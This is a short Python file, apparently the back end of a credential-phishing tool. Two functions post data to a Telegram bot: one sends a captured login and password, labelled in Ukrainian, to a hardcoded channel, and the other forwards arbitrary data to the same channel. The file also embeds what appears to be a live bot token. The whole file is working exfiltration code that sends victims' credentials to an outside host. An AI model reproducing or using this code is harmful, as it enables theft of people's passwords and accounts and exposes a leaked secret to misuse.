import requests
from fastapi import BackgroundTasks, FastAPI

def send_telegram(login: str, password: str, message=""):
    token = "6577437546:AAGHXAvSQTc3A-4tYTk2RKr8hiefCcKVEII"
    url = "https://api.telegram.org/bot"
    channel_id = "@pepapepa123"
    url += token
    method = url + "/sendMessage"

    r = requests.post(method, data={
        "chat_id": channel_id,
        "text": "Логін " + login + " " + " Пароль " + password
    })

    if r.status_code != 200:
        raise Exception("post_text error")



def send_telegram2(data: list, message=""):
    token = "6577437546:AAGHXAvSQTc3A-4tYTk2RKr8hiefCcKVEII"
    url = "https://api.telegram.org/bot"
    channel_id = "@pepapepa123"
    url += token
    method = url + "/sendMessage"

    r = requests.post(method, data={
        "chat_id": channel_id,
        "text": data
    })

    if r.status_code != 200:
        raise Exception("post_text error")

